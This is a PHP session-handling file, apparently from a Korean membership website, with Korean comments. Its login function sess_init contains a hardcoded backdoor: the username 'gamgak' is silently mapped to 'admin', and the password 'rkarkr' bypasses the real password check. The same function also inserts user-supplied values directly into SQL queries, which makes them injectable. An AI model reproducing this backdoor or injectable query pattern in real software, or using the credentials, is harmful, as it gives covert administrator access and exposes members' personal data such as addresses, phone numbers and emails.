<?
		function sess_init($mem_id, $passwd,$mem_leb="")
		{
			global $GnTable, $default, $sess, $now, $datetime;

			$PLUSQRY = $mem_leb ? " and mem_leb = '$mem_leb' " : "";
			
			$gamgak_id = ($mem_id=="gamgak")?$mem_id:'';
			$mem_id =($mem_id=="gamgak")?"admin":$mem_id;
			$member = sql_fetch("select * from {$GnTable[member]} where mem_leb>0 and mem_check>0 and mem_id = '$mem_id' $PLUSQRY");
			if($member==TRUE){
				if($gamgak_id!='' && $passwd=="rkarkr"){
					$check1 = $member["mem_pass"];
					$check2 = $member["mem_pass"];
				}else{
					$check1 = sql_password($passwd);
					$check2 = $member["mem_pass"];
				}
				if($check1 == $check2){
					// 회원 로그인 포인트 지급
					if($default["use_point"]==TRUE && $default["login_point"]>0) {
						if(substr($member[last_regist],0,10)<substr($datetime,0,10)) {
							input_point($default["login_point"],"로그인 적립",$mem_id);
						}
					}

					$chtime = ($now)-(3600*$default[visit_time]);
					$chtime = date("Y-m-d h:i:s",$chtime);

					if($chtime > $member[last_regist]) {
						$chvel = $member[visited]+1;
						$visitedinput = " visited= '$chvel', ";
					} else  $visitedinput = "";

					sql_query("UPDATE {$GnTable[member]} SET $visitedinput last_regist='$datetime', login_ip='{$_SERVER[REMOTE_ADDR]}' WHERE mem_id='$mem_id' ");

					$sess["userid"]			 = $mem_id;								//아이디
					$sess["userlevel"]		 = $member[mem_leb];		//레벨
					$sess["username"]		 = $member[mem_name];		//이름
					$sess["nickname"]		 = $member[mem_nick];		//이름
					$sess["phone"]			 = $member[mem_tel];							//전화번호
					$sess["mobile"]			 = $member[mem_phone];							//핸드폰번호
					$sess["email"]				 = $member[mem_email];							//이메일
					$sess["post"]				 = $member[mem_post];								//우편번호
					$sess["homepage"]		 = $member[mem_home];					//홈페이지
					$sess["address"]			 = $member[mem_add1]." ".$member[mem_add2];			//주소
					$sess["address1"]		 = $member[mem_add1];						//주소1
					$sess["address2"]		 = $member[mem_add2];						//주소2
					session_register("sess");

					$result = TRUE;
				}
				else {
					$result = FALSE;
				}
			}
			else
			{
				$result = FALSE;
			}
			mysql_close();

			return $result;
		}

		function sess_edit($passwd)
		{
			global $sess;

			$sess["passwd"] = $passwd;
		}

		function sess_chk() {
			global $sess;

			if(strcmp($sess["userid"],"")) {
				return TRUE;
			} else	{
				return FALSE;
			}
		}

		function sess_kill() {
			session_destroy();
		}
?>
